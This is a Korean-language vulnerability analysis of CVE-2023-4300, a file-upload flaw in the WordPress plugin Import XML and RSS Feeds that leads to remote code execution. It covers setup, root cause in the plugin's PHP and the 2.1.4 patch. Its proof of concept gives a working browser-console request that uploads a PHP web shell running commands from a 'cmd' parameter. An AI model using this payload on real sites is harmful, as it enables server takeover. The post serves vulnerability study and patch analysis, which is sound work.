---
title: "[CVE-2023-4300] 취약점 분석 보고서"
description: "Import XML and RSS Feeds에서 발생하는 RCE 취약점"
author: bde574786
date: 2024-11-18 10:51:00 +0900
categories: [One-Day 분석, WordPress]
tags: [WordPress, CVE, RCE]
---

<br>
## **1. Description**

CVE-2023-4300은 WordPress **Import XML and RSS Feeds** 플러그인에서 발생하는 **RCE 취약점**이다.  
업로드된 파일의 파일 확장자를 제대로 필터링하지 않아 공격자가 악성 PHP 파일을 업로드할 수 있고 결과적으로 권한이 없는 사용자가 WordPress 사이트에서 원격 코드를 실행할 수 있게 된다.

관련 플러그인 정보이다.

[Import XML and RSS Feeds Plugin — WordPress.com](https://wordpress.com/plugins/import-xml-feed)

<br>
## **2. Environment Setting**

### **2.1 Affected Version**

- PHP < 8.0
- Import XML and RSS Feeds < 2.1.4

> 본 분석은 XAMPP 7.4.29와 PHP 7.4.29가 포함된 환경에서 진행되었으며 해당 버전의 XAMPP는 [여기](https://sourceforge.net/projects/xampp/files/XAMPP%20Windows/7.4.29/)서 다운로드 할 수 있다. WordPress 버전은 분석에 영향을 미치지 않으므로, 설치 과정에 대한 자세한 설명은 생략한다.
> 

WordPress 플러그인 Import XML and RSS Feeds 2.1.3 버전으로 설치하고 활성화 한다.
플러그인을 활성화하면 좌측 설정 탭에서 Import Feed  항목을 확인할 수 있다.
![image.png](assets/posts/one-day/2024-11-18/img-001.png)

<br>
## **3. PoC**

해당 CVE의 PoC를 트리거하기 위해서는 관리자의 권한이 필요하다.

**3.1 관리자 권한으로 플러그인 경로 접근**

![image.png](assets/posts/one-day/2024-11-18/img-002.png)

**3.2 브라우저 콘솔을 열어 PHP 웹 쉘 파일 업로드**

```jsx
await fetch('/wordpress/wp-admin/admin-ajax.php', {
    credentials: 'include',
    method: 'POST',
    headers: {
        'Content-Type': 'application/x-www-form-urlencoded'
    },
    body: `action=moove_save_import_template&type=upload&extension=php&file=<?php+system($_GET['cmd']);?>&form_data[post_title]=RCE&nonce=${document.querySelector('input[name=moove_xml_admin_nonce]').value}`
})
```

<br>
파일 업로드 취약점이 있기 때문에 PHP 파일이 정상적으로 업로드되었음을 확인할 수 있다.

![image.png](assets/posts/one-day/2024-11-18/img-003.png)

**3.3 최근 생성한 템플릿 설정 페이지를 클릭**

Type the file URL 필드에서 업로드한 웹 쉘의 경로를 얻을 수 있다.

![image.png](assets/posts/one-day/2024-11-18/img-004.png)

**3.4 URL을 복사하여 웹 쉘 파일을 실행하고 cmd에 명령어를 전달**

RCE가 발생하면서 임의의 시스템 명령이 모두 실행되는 것을 알 수 있다.

![image.png](assets/posts/one-day/2024-11-18/img-005.png)

<br>
## **4. Analysis**

[CVE-2023-4300/import-xml-feed/moove-actions.php at main · bde574786/CVE-2023-4300](https://github.com/bde574786/CVE-2023-4300/blob/main/import-xml-feed/moove-actions.php)

1. 입력값 검증 부족
    - `moove_save_import_template` 함수에서 사용자가 전송한 file 데이터를 `sanitize_text_field`로 확장자 검증을 하고 있다.
    - `sanitize_text_field`는 HTML 태그나 특수 문자를 제거하지만, 확장자 형식의 유효성 검증에는 적합하지 않아 php와 같은 실행 가능한 파일 확장자를 업로드 할 수 있다.
        
        ```php
        if ( $_POST && is_array( $_POST ) ) :
        				$type = sanitize_text_field( $_POST['type'] );
        				$extension = sanitize_text_field( $_POST['extension'] );
        				$filename = uniqid( strtotime() );
        				if ( $type === 'upload' ) :
        					$xml = wp_unslash( $_POST['file'] );
        					$filename = $filename . "." . $extension;
        					$target_dir = dirname( __FILE__ ) . "/uploads/" . $filename;
        					file_put_contents( $target_dir, $xml, FILE_APPEND | LOCK_EX );
        ```
        

2. 메타데이터에 외부 접근 가능한 URL 저장
    - `moove_save_import_template` 함수에서 `plugins_url`으로 url을 생성하고 있다.
    - `filename` 변수는 `plugins_url` 함수를 통해 디렉토리 내의 업로드된 파일에 접근할 수 있는 전체 url이 저장된다.
    - `filename`은 ‘import_xml_url’이라는 키 이름으로 특정 게시물의 메타 데이터로 저장된다.
        
        ```php
        $filename = plugins_url( basename( dirname( __FILE__ ) ) ) . '/uploads/' . $filename;
        add_post_meta( $post_id, 'import_xml_url', $filename );
        ```
        
    
3. 파일 저장 경로 공개
    - 특정 게시물의 메타 데이터는 `template_view.php` 파일에서 사용자에게 보여진다.
    - 해당 메타데이터에 저장된 url을 통해 업로드한 파일에 접근이 가능했고, 결과적으로 RCE가 가능했다.
        
        ```php
        'feedurl' => get_post_meta( $template_id, 'import_xml_url', true ),
        ```
        
    
<br>
## **5. Patch Diff**

WordPress 플러그인들은 GitHub 대신 Trac과 Subversion(SVN)을 통해 관리되는 경우가 많으므로 svn 명령어를 사용하여 Trac의 코드 변경사항을 확인할 수 있다.

```bash
svn checkout https://plugins.svn.wordpress.org/import-xml-feed/tags/2.1.3
svn checkout https://plugins.svn.wordpress.org/import-xml-feed/tags/2.1.4
```

<br>
임시 디렉토리에 각 버전을 체크아웃한 후 확인한 변경 사항은 다음과 같다.

[Version 2.1.4 · bde574786/CVE-2023-4300@7205511](https://github.com/bde574786/CVE-2023-4300/commit/72055117358d184917b23c249435d35939817a77#diff-e0915d20b47f643113612da18cc245eac202485dd193731b6417df51b01ee214)

1. 권한 변경
    - moove_save_import_template 및 moove_delete_import_template 함수에서 기존의 edits_posts 권한이 manage_options 권한으로 변경
    - manage_options 권한은 edit_posts 보다 높은 권한이며 [Roles and Capabilities 문서](https://wordpress.org/documentation/article/roles-and-capabilities/)에서는 mange_options가 관리자 역할에게만 할당되는 고급 권한임을 명시하고 있음
2. 파일 확장자 허용 목록 추가
    - allowed_extensions 필터가 추가되어 XML과 RSS 확장자만 허용되도록 제한